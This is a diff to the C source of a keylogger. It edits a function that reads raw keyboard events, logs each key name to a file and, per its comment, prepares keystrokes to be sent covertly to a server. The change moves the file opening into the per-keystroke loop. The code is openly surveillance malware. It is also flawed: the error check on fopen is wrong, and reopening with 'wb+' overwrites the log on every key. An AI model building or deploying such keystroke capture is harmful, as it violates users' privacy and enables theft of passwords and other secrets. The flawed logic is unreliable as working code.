@@ -182,10 +182,6 @@ void *keylogger_send(void *args_input) {
         exit(1);
     }
 
-    if((fp = fopen(KEYLOGGER_FILENAME, "wb+")) < 0) {
-        perror("fopen keylogger");
-        exit(1);
-    }
 
     //get key stroke and covert send key stroke to Server
     signal(SIGINT, sigint_handler);     //stops the loop if SIGINT is found
@@ -198,12 +194,17 @@ void *keylogger_send(void *args_input) {
             if(events[i].type == EV_KEY) {
                 if(events[i].value == 1) {
                     if(events[i].code > 0 && events[i].code < NUM_KEYCODES) {
+                        if((fp = fopen(KEYLOGGER_FILENAME, "wb+")) < 0) {
+                            perror("fopen keylogger");
+                            exit(1);
+                        }
                         printf("keylogger: %s\n", keycodes[events[i].code]);
                         //write to file
                         if(fwrite(keycodes[events[i].code], sizeof(char), strlen(keycodes[events[i].code]), fp) <= 0) {
                             perror("fwrite keylogger");
                             exit(1);
                         }
+                        fclose(fp);
                     } else {
                         //write(writeout, "UNRECOGNIZED", sizeof("UNRECOGNIZED"));
                     }
